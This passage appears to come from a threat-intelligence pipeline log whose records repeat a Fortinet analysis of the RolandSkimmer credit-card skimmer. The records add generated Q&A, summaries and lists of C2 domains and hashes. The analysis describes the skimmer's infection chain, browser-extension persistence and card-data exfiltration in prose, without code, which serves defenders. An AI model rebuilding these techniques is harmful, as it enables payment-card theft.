“hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including deceptive LNK files, obfuscated scripts, and malicious browser extensions, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to financial loss and identity theft. The attackers' use of adaptive behavior, such as customizing the infection path based on the target's environment, makes this threat particularly challenging to detect and mitigate.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "browser", "apt", "malicious", "threat", "botnet", "bank", "banking trojan", "phishing", "analysis"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["intelligence", "threat", "browser", "apt", "banking trojan", "malicious", "phishing", "analysis", "bank", "botnet"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe 